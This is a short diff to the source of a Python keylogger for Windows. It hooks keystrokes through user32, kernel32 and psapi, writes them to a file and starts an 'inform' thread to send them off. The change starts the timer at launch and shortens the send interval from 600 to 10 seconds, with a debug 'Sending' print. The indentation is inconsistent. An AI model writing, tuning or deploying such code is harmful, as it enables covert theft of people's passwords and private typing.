@@ -20,7 +20,7 @@ user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 current_window = None
-st_time = None
+st_time = time.time()
 
 def get_current_process():
     # get a handle to the foreground window
@@ -87,7 +87,8 @@ def KeyStroke(event):
 		   f_des.close()
 	# pass execution to the next registered hook
 	
-            if (time.time() - st_time > 600):
+            if (time.time() - st_time > 10):
+			         print "Sending >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
                      st_time = time.time()
                      thread_i = threading.Thread(target=inform)
                      thread_i.start()
